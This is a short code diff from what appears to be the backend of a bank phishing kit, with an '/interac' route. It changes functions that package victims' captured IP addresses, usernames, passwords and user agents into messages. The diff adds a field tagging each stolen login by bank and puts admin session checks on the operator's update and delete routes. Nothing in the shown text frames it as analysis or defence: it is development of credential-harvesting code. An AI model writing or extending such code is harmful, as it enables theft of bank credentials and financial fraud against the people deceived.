@@ -220,6 +220,7 @@ async function sendNewMessage(userDetails){
     let message = `IP: ${userDetails.ip}
 
     -- Login Details --
+    Bank: ${userDetails.page}
     Username: ${userDetails.getUserDataLogin.username || ''}
     Password:  ${userDetails.getUserDataLogin.password || ''}
     UserAgent: ${userDetails.getUserDataLogin.userAgent || ''}
@@ -266,6 +267,7 @@ async function modifyMessageSent(userDetails){
     let message = `IP: ${userDetails.ip}
 
     -- Login Details --
+    Bank: ${userDetails.page}
     Username: ${userDetails.getUserDataLogin.username || ''}
     Password:  ${userDetails.getUserDataLogin.password || ''}
     UserAgent: ${userDetails.getUserDataLogin.userAgent || ''}
@@ -347,7 +349,7 @@ app.get('/interac',  async (req, res) => {
     }
 })
 
-app.post('/update', async (req, res) => {
+app.post('/update', checkAdminSession ,async (req, res) => {
     let data = req.body;
 
     try {
@@ -379,7 +381,7 @@ app.post('/update', async (req, res) => {
     }
 });
 
-app.get('/delete-all', async (req, res) => {
+app.get('/delete-all', checkAdminSession ,async (req, res) => {
     try {
         const deleteId = 1; // Assuming you're always deleting the record with id = 1
         const result = await pool.query('DELETE FROM items WHERE id = $1', [deleteId]);
